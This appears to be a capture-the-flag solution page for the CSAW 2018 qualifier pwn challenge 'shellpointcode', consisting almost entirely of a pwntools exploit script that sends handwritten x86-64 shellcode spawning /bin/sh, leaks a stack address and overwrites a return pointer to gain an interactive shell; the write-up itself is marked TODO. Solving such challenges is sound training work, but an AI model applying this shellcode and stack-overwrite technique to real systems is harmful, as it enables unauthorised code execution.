# CSAW ctf quals 2018 : shellpointcode

**Category:** Pwn
**Points:** 100

r = remote("pwn.chal.csaw.io",9005)
#r = process("./shellpointcode")
#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(r, gdbscript='''
#    continue
#''')

raw_input()
#break *0x555555554918

print r.recvuntil(":")
payload1 = "\x3b\x00\x00\x00\x00\x00\x00\x00" #location
r.sendline(payload1)
print r.recvuntil(":")
payload2 = "\x53\x5e\x55\x53\x5a\x48\x8d\x3c\x24\x50\xB0\x3B\x0f\x05\x90"
# x/20i $rip-20

# push rbx = \x53 push null characters
# pop rsi = \x5e
# push rbp = \x55 push /bin//sh onto stack
# lea rdi, [rsp] = \x48\x8d\x3c\x24
# syscall = \x0F\x05
# pop rax = \x58

# pop rdx = \x5a
# add rsp,0x28 = \x48\x83\xC4\x28

r.sendline(payload2)
print r.recvuntil("0x")
beis = r.recv(12)
log.info("location of Bs: " + beis)
print r.recvuntil("?")
payload3 = "a" * 3 + "\x2F\x62\x69\x6E\x2F\x2F\x73\x68" + p64( int(beis, 16) + 0x8) + "\x00"
#this will have the string of /bin//sh and a null termininator after the popped
r.sendline(payload3)
print "payload sent"
#raw_input()
r.recvline()
r.interactive()

## Write-up

(TODO)

## Other write-ups and resources

* none yet
